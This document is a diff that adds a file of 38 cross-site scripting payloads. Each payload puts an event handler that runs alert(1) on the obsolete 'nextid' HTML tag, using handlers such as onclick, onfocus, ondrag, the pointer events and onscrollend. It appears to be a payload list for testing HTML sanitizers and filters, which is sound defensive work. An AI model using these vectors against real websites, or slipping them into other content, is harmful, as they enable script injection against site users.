@@ -1,0 +1,38 @@
+<nextid contenteditable onbeforeinput=alert(1)>test
+<nextid draggable="true" ondrag="alert(1)" style=display:block>test</nextid>
+<nextid draggable="true" ondragend="alert(1)" style=display:block>test</nextid>
+<nextid draggable="true" ondragenter="alert(1)" style=display:block>test</nextid>
+<nextid draggable="true" ondragleave="alert(1)" style=display:block>test</nextid>
+<nextid draggable="true" ondragstart="alert(1)" style=display:block>test</nextid>
+<nextid id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></nextid>
+<nextid id=x tabindex=1 onfocus=alert(1)></nextid>
+<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>
+<nextid onafterscriptexecute=alert(1)><script>1</script>
+<nextid onbeforescriptexecute=alert(1)><script>1</script>
+<nextid onblur=alert(1) id=x tabindex=1 style=display:block>test</nextid><input value=clickme>
+<nextid onclick="alert(1)" style=display:block>test</nextid>
+<nextid oncontextmenu="alert(1)" style=display:block>test</nextid>
+<nextid oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<nextid oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<nextid ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</nextid>
+<nextid onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</nextid><input value=clickme>
+<nextid onkeydown="alert(1)" contenteditable style=display:block>test</nextid>
+<nextid onkeypress="alert(1)" contenteditable style=display:block>test</nextid>
+<nextid onkeyup="alert(1)" contenteditable style=display:block>test</nextid>
+<nextid onmousedown="alert(1)" style=display:block>test</nextid>
+<nextid onmouseenter="alert(1)" style=display:block>test</nextid>
+<nextid onmouseleave="alert(1)" style=display:block>test</nextid>
+<nextid onmousemove="alert(1)" style=display:block>test</nextid>
+<nextid onmouseout="alert(1)" style=display:block>test</nextid>
+<nextid onmouseover="alert(1)" style=display:block>test</nextid>
+<nextid onmouseup="alert(1)" style=display:block>test</nextid>
+<nextid onmousewheel=alert(1) style=display:block>requires scrolling
+<nextid onpointerdown=alert(1) style=display:block>XSS</nextid>
+<nextid onpointerenter=alert(1) style=display:block>XSS</nextid>
+<nextid onpointerleave=alert(1) style=display:block>XSS</nextid>
+<nextid onpointermove=alert(1) style=display:block>XSS</nextid>
+<nextid onpointerout=alert(1) style=display:block>XSS</nextid>
+<nextid onpointerover=alert(1) style=display:block>XSS</nextid>
+<nextid onpointerrawupdate=alert(1) style=display:block>XSS</nextid>
+<nextid onpointerup=alert(1) style=display:block>XSS</nextid>
+<nextid onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></nextid>
